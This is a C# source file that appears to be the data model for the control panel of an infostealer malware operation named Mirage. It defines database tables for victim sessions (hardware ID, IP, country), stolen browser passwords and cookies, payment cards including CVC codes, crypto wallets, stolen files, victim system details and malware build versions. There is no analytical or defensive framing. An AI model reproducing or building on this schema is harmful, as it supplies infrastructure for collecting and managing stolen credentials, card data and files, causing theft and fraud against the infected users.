using System.ComponentModel.DataAnnotations;

namespace Mirage.Panel.Models;

public class Session
{
    [Key] public string Id { get; set; } = Guid.NewGuid().ToString("N");
    public string? BuildId { get; set; }
    public string? Hwid { get; set; }
    public string? Os { get; set; }
    public string? Username { get; set; }
    public string? Ip { get; set; }
    public string? CountryCode { get; set; }
    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;
    public ICollection<Password> Passwords { get; set; } = new List<Password>();
    public ICollection<Cookie> Cookies { get; set; } = new List<Cookie>();
    public ICollection<Card> Cards { get; set; } = new List<Card>();
    public ICollection<Wallet> Wallets { get; set; } = new List<Wallet>();
    public ICollection<StolenFile> Files { get; set; } = new List<StolenFile>();
    public SystemInfo? SystemInfo { get; set; }
}

public class Password
{
    [Key] public string Id { get; set; } = Guid.NewGuid().ToString("N");
    public string SessionId { get; set; } = "";
    public string? Url { get; set; }
    public string? Username { get; set; }
    public string? PasswordValue { get; set; }
    public string? Browser { get; set; }
}

public class Cookie
{
    [Key] public string Id { get; set; } = Guid.NewGuid().ToString("N");
    public string SessionId { get; set; } = "";
    public string? Domain { get; set; }
    public string? Name { get; set; }
    public string? Value { get; set; }
    public string? Path { get; set; }
}

public class Card
{
    [Key] public string Id { get; set; } = Guid.NewGuid().ToString("N");
    public string SessionId { get; set; } = "";
    public string? Number { get; set; }
    public string? ExpMonth { get; set; }
    public string? ExpYear { get; set; }
    public string? Holder { get; set; }
    public string? Cvc { get; set; }
}

public class Wallet
{
    [Key] public string Id { get; set; } = Guid.NewGuid().ToString("N");
    public string SessionId { get; set; } = "";
    public string? Name { get; set; }
    public string? Path { get; set; }
}

public class StolenFile
{
    [Key] public string Id { get; set; } = Guid.NewGuid().ToString("N");
    public string SessionId { get; set; } = "";
    public string? Filename { get; set; }
    public long Size { get; set; }
}

public class SystemInfo
{
    [Key] public string SessionId { get; set; } = "";
    public string? Cpu { get; set; }
    public string? Gpu { get; set; }
    public string? Ram { get; set; }
    public string? Os { get; set; }
    public string? Screen { get; set; }
    public string? Hostname { get; set; }
    public string? LocalIp { get; set; }
    public string? Mac { get; set; }
}

public class Build
{
    [Key] public string Id { get; set; } = Guid.NewGuid().ToString("N");
    public int Version { get; set; }
    public string? ConfigHash { get; set; }
    public long FileSize { get; set; }
    public DateTime CreatedAt { get; set; } = DateTime.UtcNow;
}
